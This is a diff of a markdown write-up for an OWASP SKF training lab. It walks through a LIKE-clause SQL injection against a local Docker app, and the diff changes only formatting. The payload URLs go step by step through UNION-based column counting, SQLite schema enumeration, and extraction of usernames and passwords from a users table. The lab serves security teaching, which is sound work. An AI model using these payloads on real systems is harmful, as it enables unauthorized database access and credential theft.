@@ -1,12 +1,12 @@
-# KBID 156 - SQLI \(Like\)
+# Python - SQLI (Like)
 
 ## Running the app
 
-```text
+```
 $ sudo docker pull blabla1337/owasp-skf-lab:sqli-like
 ```
 
-```text
+```
 $ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:sqli-like
 ```
 
@@ -16,9 +16,7 @@ Now that the app is running let's go hacking!
 
 ## Running the app Python3
 
-First, make sure python3 and pip are installed on your host machine.
-After installation, we go to the folder of the lab we want to practise
-"i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
+First, make sure python3 and pip are installed on your host machine. After installation, we go to the folder of the lab we want to practise "i.e /skf-labs/XSS/, /skf-labs/jwt-secret/ " and run the following commands:
 
 ```
 $ pip3 install -r requirements.txt
@@ -32,7 +30,7 @@ $ python3 <labname>
 Now that the app is running let's go hacking!
 {% endhint %}
 
-![Docker image and write-up thanks to Contrahack.io !](../../.gitbook/assets/screen-shot-2019-03-04-at-21.33.32.png)
+![Docker image and write-up thanks to Contrahack.io !](<../../.gitbook/assets/ing\_primary\_logo (2).png>)
 
 ## Reconnaissance
 
@@ -42,7 +40,7 @@ The first step is to identify parameters which could be potentially used in an S
 
 ![](../../.gitbook/assets/sqli-like-1.png)
 
-```text
+```
 http://localhost:5000/home/Admin
 ```
 
@@ -52,7 +50,7 @@ Now let's see if we can create an error by injecting a single quote
 
 ![](../../.gitbook/assets/sqli-like-2.png)
 
-```text
+```
 http://localhost:5000/home/Admin'
 ```
 
@@ -68,15 +66,15 @@ Now we need to inject characters to make the SQL query syntactically correct.
 
 ![](../../.gitbook/assets/sqli-like-3.png)
 
-```text
+```
 http://localhost:5000/home/Admin%'--
 ```
 
-After that we inject a logical operator which is true \(and 1=1\). This should result in the application run as intended without errors.
+After that we inject a logical operator which is true (and 1=1). This should result in the application run as intended without errors.
 
 ![](../../.gitbook/assets/sqli-like-4.png)
 
-```text
+```
 http://127.0.0.1:5000/home/Admin%' AND 1=1--
 ```
 
@@ -90,16 +88,16 @@ The UNION operator is used in SQL injections to join a query, purposely forged t
 
 ![](../../.gitbook/assets/sqli-like-5.png)
 
-```text
+```
 http://localhost:5000/home/Admin%' union select 1--
 ```
 
-This query results in an error, this is due to the fact that the original query started with 2 columns namely  
+This query results in an error, this is due to the fact that the original query started with 2 columns namely\
 \* UserName \* email
 
 ![](../../.gitbook/assets/sqli-like-6.png)
 
-```text
+```
 http://localhost:5000/home/Admin%' union select 1,2--
 ```
 
@@ -111,7 +109,7 @@ Now that we determined the number of columns we need to take, the next step is q
 
 ![](../../.gitbook/assets/sqli-like-7.png)
 
-```text
+```
 http://localhost:5000/home/Admin%' union select 1,2 from sqlite_master--
 ```
 
@@ -121,7 +119,7 @@ Now we need to discover the table and columns name of the table we want to extra
 
 ![](../../.gitbook/assets/sqli-like-8.png)
 
-```text
+```
 http://localhost:5000/home/Admin%' union select tbl_name,sql from sqlite_master limit 1,1--
 ```
 
@@ -131,7 +129,7 @@ Now we have all the information required to extract data from _users_ table. Pla
 
 ![](../../.gitbook/assets/sqli-like-9.png)
 
-```text
+```
 http://localhost:5000/home/Admin%' union select UserName,Password from users limit 0,1--
 ```
 
@@ -139,8 +137,8 @@ http://localhost:5000/home/Admin%' union select UserName,Password from users lim
 
 Please refer to the OWASP testing guide for a full complete description about SQL injection with all the edge cases over different platforms!
 
-[https://www.owasp.org/index.php/Testing_for_SQL_Injection\_\(OTG-INPVAL-005\)](https://www.owasp.org/index.php/Testing_for_SQL_Injection_%28OTG-INPVAL-005%29)
+[https://www.owasp.org/index.php/Testing\_for\_SQL\_Injection\_(OTG-INPVAL-005)](https://www.owasp.org/index.php/Testing\_for\_SQL\_Injection\_\(OTG-INPVAL-005\))
 
 SQLite Reference
 
-[https://www.techonthenet.com/sqlite/sys_tables/index.php](https://www.techonthenet.com/sqlite/sys_tables/index.php)
+[https://www.techonthenet.com/sqlite/sys\_tables/index.php](https://www.techonthenet.com/sqlite/sys\_tables/index.php)
